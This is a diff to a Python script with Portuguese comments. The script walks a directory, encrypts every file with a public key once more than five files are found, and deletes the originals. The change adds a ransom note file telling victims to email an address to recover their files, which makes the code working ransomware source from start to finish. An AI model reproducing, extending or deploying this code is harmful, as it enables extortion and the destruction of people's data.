@@ -5,6 +5,8 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives import serialization
 
+LIMIT = 5
+
 # Função para criptografar arquivos
 def encrypt_file(filepath, public_key):
     with open(filepath, "rb") as f:
@@ -24,12 +26,6 @@ def encrypt_file(filepath, public_key):
 
     os.remove(filepath)  # Remove o arquivo original
 
-# Criptografa todos os arquivos de um diretório
-# def encrypt_directory(directory, public_key):
-#     for filepath in glob.glob(os.path.join(directory, "*")):
-#         if not filepath.endswith(".enc"):  # Evita recriptografar arquivos
-#             encrypt_file(filepath, public_key)
-
 def main(args):
   input_path = args.input
 
@@ -47,19 +43,20 @@ def main(args):
       public_key = serialization.load_pem_public_key(f.read())
 
   total_files = sum(len(files) for _, _, files in os.walk(input_path))
-  limit = 5
 
   for root, _, files in os.walk(input_path):
         for file in files:
           filepath = os.path.join(root, file)
-          if total_files > limit:
+          if total_files > LIMIT:
             if not filepath.endswith(".enc"):  # Evita recriptografar arquivos
                 encrypt_file(filepath, public_key)
           else:
               file_size = os.path.getsize(filepath)
               print(f"{filepath}: {file_size} bytes")
-  if total_files > limit:
-    print("Arquivos criptografados com sucesso!")
+  if total_files > LIMIT:
+    with open(os.path.join(input_path + "/!!!!!!!!INSTRUCOES!!!!!!!!.txt"), "w") as f:
+                  f.write("Contate o email foo@gmail.com para recuperar seus arquivos")
+    print("!!!!!!!!INSTRUCOES!!!!!!!!.txt")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
